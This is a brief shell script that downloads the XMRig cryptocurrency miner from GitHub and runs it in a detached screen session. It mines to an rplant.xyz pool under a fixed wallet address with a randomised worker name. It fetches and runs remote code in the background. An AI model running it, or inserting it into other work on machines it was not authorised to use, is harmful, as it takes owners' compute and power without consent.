#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
tar -xf xmrig-6.18.0-linux-x64.tar.gz
cd xmrig-6.18.0
screen -dmS run ./xmrig -a ghostrider -o stratum-eu.rplant.xyz:17075 --tls -u BVdAKt5opzf6tDqAzyZqgb87VXdvKnwchV.as-$(echo $(shuf -i 10000-99999 -n 1)) -p x --pass -t 4
